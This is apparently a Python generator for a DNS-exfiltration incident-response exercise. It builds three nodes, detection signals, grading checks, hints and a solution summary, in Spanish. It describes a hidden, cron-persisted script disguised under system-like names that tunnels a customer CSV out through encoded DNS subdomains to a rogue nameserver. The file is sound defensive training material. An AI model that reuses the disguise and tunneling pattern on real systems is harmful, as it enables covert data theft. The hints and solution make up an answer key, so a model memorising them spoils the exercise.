        "text": "las consultas largas van dirigidas a {1}, un destino que no es el resolver corporativo",
        "cmd": r"""f=/var/log/dnsaudit.log; [ -s $f ] || exit 0
. /etc/chaos_nodes.env
ip=$(awk -F'LEN=' '{split($2,a," "); if (a[1]>50) print $1}' $f | grep -o 'DST=[0-9.]*' | sort | uniq -c | sort -rn | head -1 | sed 's/.*DST=//')
[ -n "$ip" ] && [ "$ip" != "$IP_CORP_DNS" ] || exit 0
first=$(grep -m1 "DST=$ip " $f | cut -d' ' -f1)
echo "$(( $(date -d "$first" +%s) + 1 ))|$(echo $ip | sed -E 's/\.[0-9]+$/.x/')"
""",
    },
    {
        "node": "infected-host",
        "sev": "warn",
        "text": "{1} subdominios únicos bajo un mismo dominio de segundo nivel (cadenas aparentemente codificadas)",
        "cmd": r"""f=/var/log/dnsaudit.log; [ -s $f ] || exit 0
n=$(awk -F'LEN=' '{split($2,a," "); if (a[1]>50) print $2}' $f | awk '{print $2}' | sort -u | wc -l); [ "$n" -gt 2 ] || exit 0
first=$(awk -F'LEN=' '{split($2,a," "); if (a[1]>50) {print $1; exit}}' $f | cut -d' ' -f1)
echo "$(( $(date -d "$first" +%s) + 1 ))|$n"
""",
    },
    {
        "node": "infected-host",
        "sev": "warn",
        "text": "cadencia regular: una consulta larga cada ~{1} s (comportamiento de beaconing automatizado)",
        "cmd": r"""f=/var/log/dnsaudit.log; [ -s $f ] || exit 0
l=$(awk -F'LEN=' '{split($2,a," "); if (a[1]>50) print $1}' $f | cut -d' ' -f1)
n=$(echo "$l" | wc -l); [ "$n" -gt 2 ] || exit 0
a=$(date -d "$(echo "$l" | head -1)" +%s); b=$(date -d "$(echo "$l" | tail -1)" +%s)
echo "$b|$(( (b-a)/(n-1) ))"
""",
    },
]


def build_dns_exfil(rng: random.Random) -> dict[str, Any]:
    zone = rng.choice(["corp.lan", "acme.internal", "empresa.local", "intranet.lan"])
    portal_ip = f"10.{rng.randint(20, 90)}.{rng.randint(1, 250)}.{rng.randint(2, 250)}"
    other_ip = f"10.{rng.randint(20, 90)}.{rng.randint(1, 250)}.{rng.randint(2, 250)}"
    words = ["cdn", "update", "metrics", "sync", "telemetry", "static", "assets", "pkg"]
    domain = f"{rng.choice(words)}-{rng.choice(words)}{rng.randint(10, 99)}.{rng.choice(['top', 'xyz', 'click', 'site'])}"
    hidden = rng.choice([".fontcache", ".dbus-sync", ".pkg-refresh", ".snapd-cache", ".kde-cache"])
    script = rng.choice(["fc-update.py", "agent.py", "refresh.py", "dbus-helper.py"])
    cron_name = rng.choice(["sysstat-refresh", "man-db-sync", "logrotate-extra", "apt-news"])
    cron_mode = rng.choice(["etc", "user"])
    period = rng.choice(["1.5", "2", "2.5"])
    chunk = rng.choice([44, 48, 52])
    salt = rng.randint(100, 999)
    path_dir = f"/var/tmp/{hidden}"

    records = f'"portal.{zone}": "{portal_ip}", "intranet.{zone}": "{other_ip}"'
    corp_srv = _render(_DNS_SERVER_PY, MODE="corp", ZONE=zone, RECORDS=records, LOG="/var/log/dns/queries.log")
    rogue_srv = _render(_DNS_SERVER_PY, MODE="rogue", ZONE=zone, RECORDS="", LOG="/var/log/exfil.log")
    exfil = _render(_EXFIL_PY, DOMAIN=domain, CHUNK=chunk, PERIOD=period)

    corp = _render(_DNS_CORP_SETUP, SERVER=corp_srv.strip())
    rogue = _render(_DNS_ROGUE_SETUP, SERVER=rogue_srv.strip())
    infected = _render(
        _DNS_INFECTED_SETUP,
        DIR=path_dir,
        SCRIPT=script,
        EXFIL=exfil.strip(),
        AUDIT=_DNSAUDIT_PY.strip(),
        ZONE=zone,
        SALT=salt,
        CRONMODE=cron_mode,
        CRONNAME=cron_name,
    )

    marker = hidden.lstrip(".")
    return {
        "vars": {"zone": zone, "c2_domain": domain, "hidden_dir": path_dir, "cron_mode": cron_mode, "script": script, "cron_name": cron_name},
        "nodes": [
            {"role": "corp-dns", "distro": "debian", "shell": "/bin/bash", "default_user": "root", "setup_timeout": 90, "setup_sh": corp},
            {"role": "ns-externo", "distro": "debian", "shell": "/bin/bash", "default_user": "root", "setup_timeout": 90, "setup_sh": rogue},
            {"role": "infected-host", "distro": "debian", "shell": "/bin/bash", "default_user": "root", "caps": ["NET_ADMIN", "NET_RAW"], "setup_timeout": 90, "setup_sh": infected},
        ],
        "checks": [
            {
                "id": "exfil-process-dead",
                "label": "En infected-host ya no hay ningún proceso enviando datos (el proceso responsable está parado)",
                "node": "infected-host",
                "cmd": f"! pgrep -f '/var/tmp/\\{hidden}/' >/dev/null",
            },
            {
                "id": "persistence-gone",
                "label": "La persistencia (cron) que relanzaba el proceso ha desaparecido de infected-host",
                "node": "infected-host",
                "cmd": (
                    f"! grep -rqs '{marker}' /etc/cron.d /etc/crontab /var/spool/cron /etc/cron.hourly /etc/cron.daily /etc/rc.local 2>/dev/null "
                    f"&& ! (crontab -l 2>/dev/null | grep -q '{marker}')"
                ),
            },
            {
                "id": "dns-egress-blocked",
                "label": "nftables en infected-host bloquea la salida DNS hacia el servidor externo no autorizado",
                "node": "infected-host",
                "cmd": (
                    f". /etc/chaos_nodes.env; R=$(nft list ruleset | sed -E 's/comment \"[^\"]*\"//g'); "
                    f"echo \"$R\" | grep -Eq \"$IP_NS_EXTERNO|dport (53|domain)\" && echo \"$R\" | grep -Eq 'drop|reject' "
                    f"&& ! dig +time=1 +tries=1 +short @\"$IP_NS_EXTERNO\" probe.{domain} >/dev/null 2>&1"
                ),
            },
            {
                "id": "dns-legit-ok",
                "label": f"La resolución legítima sigue funcionando: portal.{zone} vía corp-dns",
                "node": "infected-host",
                "cmd": f". /etc/chaos_nodes.env; dig +time=2 +tries=2 +short @\"$IP_CORP_DNS\" portal.{zone} | grep -q '{portal_ip}'",
            },
            {
                "id": "exfil-stopped-at-ns",
                "label": "ns-externo lleva más de 8 s sin recibir ninguna consulta nueva (la exfiltración ha cesado)",
                "node": "ns-externo",
                "cmd": "[ -f /var/log/exfil.log ] && [ $(( $(date +%s) - $(stat -c %Y /var/log/exfil.log) )) -gt 8 ]",
            },
        ],
        "hints": [
            "En `infected-host` el sensor `dnsaudit` registra cada consulta DNS saliente en `/var/log/dnsaudit.log`: ordena por `LEN=` y mira `DST=` y `QNAME=`. Un QNAME legítimo mide pocos caracteres; los codificados, más de 50.",
            "Busca quién envía eso: `ss -uanp` (¿a qué IP:53 habla?), `ps aux --forest` y los programadores de tareas (`ls /etc/cron.d`, `crontab -l`). El proceso vive en un directorio oculto bajo `/var/tmp`.",
            "Para el proceso (`pkill -f`), elimina la entrada de cron (y el script) y bloquea con nftables la salida DNS que no vaya al resolver autorizado: `nft add rule inet filter output udp dport 53 ip daddr != <IP_corp-dns> drop` (y lo mismo con `tcp`).",
        ],
        "topology": {
            "entry": None,
            "nodes": {
                "corp-dns": {"runs": f"resolver corporativo :53 · {zone}", "look": ["/var/log/dns/queries.log", "ss -ulnp"]},
                "infected-host": {"runs": "host de aplicaciones · /srv/finance", "look": ["/etc/resolv.conf", "/srv/finance", "/var/log/"]},
                "ns-externo": {"runs": "servidor DNS :53 fuera de la empresa", "look": ["ss -ulnp"]},
            },
            "links": [
                {"from": "infected-host", "to": "corp-dns", "via": "DNS :53"},
                {"from": "infected-host", "to": "ns-externo", "via": "DNS :53"},
            ],
            "checks": {"exfil-process-dead": "node:infected-host", "persistence-gone": "node:infected-host", "dns-legit-ok": "link:0", "dns-egress-blocked": "link:1", "exfil-stopped-at-ns": "node:ns-externo"},
        },
        "solution_summary": (
            f"Un script oculto en `{path_dir}/{script}`, relanzado por cron cada minuto (`{'/etc/cron.d/' + cron_name if cron_mode == 'etc' else 'crontab de root'}`), "
            f"codificaba `/srv/finance/clientes.csv` en base32 y lo enviaba en subdominios largos de `{domain}` directamente a `ns-externo` por UDP/53, saltándose el resolver corporativo.\n"
            "Solución: localizarlo en `/var/log/dnsaudit.log` (QNAME > 50 caracteres hacia una IP que no es `corp-dns`), matar el proceso, quitar la persistencia de cron y "
            "bloquear con `nft add rule inet filter output udp dport 53 ip daddr != <IP_corp-dns> drop` para mantener solo la resolución autorizada."
        ),
        "signals": _DNS_SIGNALS,
    }
